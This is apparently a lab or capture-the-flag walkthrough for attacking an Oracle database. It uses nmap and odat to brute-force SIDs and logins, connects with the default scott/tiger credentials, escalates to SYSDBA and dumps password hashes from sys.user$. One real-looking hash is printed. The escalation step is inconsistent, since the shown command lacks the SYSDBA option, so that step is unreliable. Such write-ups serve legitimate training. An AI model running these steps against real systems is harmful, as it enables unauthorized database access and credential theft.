# Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

We start with a nmap scan to check the oracle service is up and running in the default port

`sudo nmap -p1521 -sV 10.129.230.109 --open`

    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 13:53 CDT
    Nmap scan report for 10.129.230.109
    Host is up (0.35s latency).
    
    PORT     STATE SERVICE    VERSION
    1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 9.27 seconds

It is. We continue with a scan with [odat](https://github.com/quentinhardy/odat)

`./odat.py all -s 10.129.230.109`

Make some coffee. This will take a while :)

After some outputs:

    [+] Checking if target 10.129.230.109:1521 is well configured for a connection...
    [+] According to a test, the TNS listener 10.129.230.109:1521 is well configured. Continue...
    
    [1] (10.129.230.109:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
    [+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.
    
    [2] (10.129.230.109:1521): Searching valid SIDs
    [2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.230.109:1521 server
    [+] 'XE' is a valid SID. Continue...           ############################################################# | ETA:  00:00:01 
    100% |#######################################################################################################| Time: 00:02:24 
    [2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.230.109:1521)
    100% |#######################################################################################################| Time: 00:00:07 
    [2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.230.109:1521)
    [+] 'XE' is a valid SID. Continue...           ##################################################            | ETA:  00:00:12 
    100% |#######################################################################################################| Time: 00:01:59 
    [+] SIDs found on the 10.129.230.109:1521 server: XE
    
    [3] (10.129.230.109:1521): Searching valid Service Names
    [3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.230.109:1521 server
    [+] 'XE' is a valid Service Name. Continue...  ############################################################# | ETA:  00:00:01 
    [+] 'XEXDB' is a valid Service Name. Continue... 
    100% |#######################################################################################################| Time: 00:02:19 
    [3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (10.129.230.109:1521)
    100% |#######################################################################################################| Time: 00:00:03 
    [3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (10.129.230.109:1521)
    [+] 'XE' is a valid Service Name. Continue...  ##################################################            | ETA:  00:00:13 
    100% |#######################################################################################################| Time: 00:01:57 
    [+] Service Name(s) found on the 10.129.230.109:1521 server: XE,XEXDB
    [!] Notice: SID 'XE' found. Service Name 'XE' found too: Identical database instance. Removing Service Name 'XE' from Service Name list in order to don't do same checks twice

You will have this question: 

    The login cis has already been tested at least once. What do you want to do:                                 | ETA:  00:08:30 
    - stop (s/S)
    - continue and ask every time (a/A)
    - skip and continue to ask (p/P)
    - continue without to ask (c/C)

I gonna choose C

`C` + enter

At some point you will have this output:

    [!] Notice: 'ctxsys' account is locked, so skipping this username for password                               | ETA:  00:53:50 
    [!] Notice: 'dbsnmp' account is locked, so skipping this username for password                               | ETA:  00:47:45 
    [!] Notice: 'dip' account is locked, so skipping this username for password                                  | ETA:  00:40:42 
    [!] Notice: 'hr' account is locked, so skipping this username for password                                   | ETA:  00:24:33 
    [!] Notice: 'mdsys' account is locked, so skipping this username for password                                | ETA:  00:14:50 
    [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password                           | ETA:  00:10:08 
    [!] Notice: 'outln' account is locked, so skipping this username for password                                | ETA:  00:08:44 
    [+] Valid credentials found: scott/tiger. Continue...                                                        | ETA:  00:04:13 
    [!] Notice: 'xdb' account is locked, so skipping this username for password#############################     | ETA:  00:00:45 
    100% |#######################################################################################################| Time: 00:18:30 
    [+] Accounts found on 10.129.230.109:1521/sid:XE: 
    scott/tiger

scott/tiger are user/password credentials we can use to connect to Oracle.

Let's run:

`sqlplus scott/tiger@10.129.230.109/XE`

    Output:
    
    SQL*Plus: Release 21.0.0.0.0 - Production on Mon Sep 30 14:27:58 2024
    Version 21.12.0.0.0
    
    Copyright (c) 1982, 2022, Oracle.  All rights reserved.
    
    ERROR:
    ORA-28002: the password will expire within 7 days
    
    
    
    Connected to:
    Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
    
    SQL> 


Let's try to retrieves all role privileges granted to the current user
`SQL> select * from user_role_privs;`

    USERNAME		       GRANTED_ROLE		      ADM DEF OS_
    ------------------------------ ------------------------------ --- --- ---
    SCOTT			       CONNECT			      NO  YES NO
    SCOTT			       RESOURCE 		      NO  YES NO

This is not very useful. Let's try to connect again as `sysdba` and have elevated SYSDBA privileges. (SYSDBA privileges in Oracle grant the highest level of administrative access)

`sqlplus scott/tiger@10.129.230.109/XE`
`SQL> select * from user_role_privs;`

Now we are talking. Look at the output:
    
    USERNAME		       GRANTED_ROLE		      ADM DEF OS_
    ------------------------------ ------------------------------ --- --- ---
    SYS			       ADM_PARALLEL_EXECUTE_TASK      YES YES NO
    SYS			       APEX_ADMINISTRATOR_ROLE	      YES YES NO
    SYS			       AQ_ADMINISTRATOR_ROLE	      YES YES NO
    SYS			       AQ_USER_ROLE		      YES YES NO
    SYS			       AUTHENTICATEDUSER	      YES YES NO
    SYS			       CONNECT			      YES YES NO
    SYS			       CTXAPP			      YES YES NO
    SYS			       DATAPUMP_EXP_FULL_DATABASE     YES YES NO
    SYS			       DATAPUMP_IMP_FULL_DATABASE     YES YES NO
    SYS			       DBA			      YES YES NO
    SYS			       DBFS_ROLE		      YES YES NO
    
    USERNAME		       GRANTED_ROLE		      ADM DEF OS_
    ------------------------------ ------------------------------ --- --- ---
    SYS			       DELETE_CATALOG_ROLE	      YES YES NO
    SYS			       EXECUTE_CATALOG_ROLE	      YES YES NO
    SYS			       EXP_FULL_DATABASE	      YES YES NO
    SYS			       GATHER_SYSTEM_STATISTICS       YES YES NO
    SYS			       HS_ADMIN_EXECUTE_ROLE	      YES YES NO
    SYS			       HS_ADMIN_ROLE		      YES YES NO
    SYS			       HS_ADMIN_SELECT_ROLE	      YES YES NO
    SYS			       IMP_FULL_DATABASE	      YES YES NO
    SYS			       LOGSTDBY_ADMINISTRATOR	      YES YES NO
    SYS			       OEM_ADVISOR		      YES YES NO
    SYS			       OEM_MONITOR		      YES YES NO
    
    USERNAME		       GRANTED_ROLE		      ADM DEF OS_
    ------------------------------ ------------------------------ --- --- ---
    SYS			       PLUSTRACE		      YES YES NO
    SYS			       RECOVERY_CATALOG_OWNER	      YES YES NO
    SYS			       RESOURCE 		      YES YES NO
    SYS			       SCHEDULER_ADMIN		      YES YES NO
    SYS			       SELECT_CATALOG_ROLE	      YES YES NO
    SYS			       XDBADMIN 		      YES YES NO
    SYS			       XDB_SET_INVOKER		      YES YES NO
    SYS			       XDB_WEBSERVICES		      YES YES NO
    SYS			       XDB_WEBSERVICES_OVER_HTTP      YES YES NO
    SYS			       XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO

Now let's try to get the hash of the password:

`SQL> select name, password from sys.user$;`

You will have an output like this: 

    OEM_MONITOR
    DBSNMP			       [THIS IS THE ANSWER]
    APPQOSSYS		       519D632B7EE7F63A

And that's all! 

New dark spell mastered! 🧙
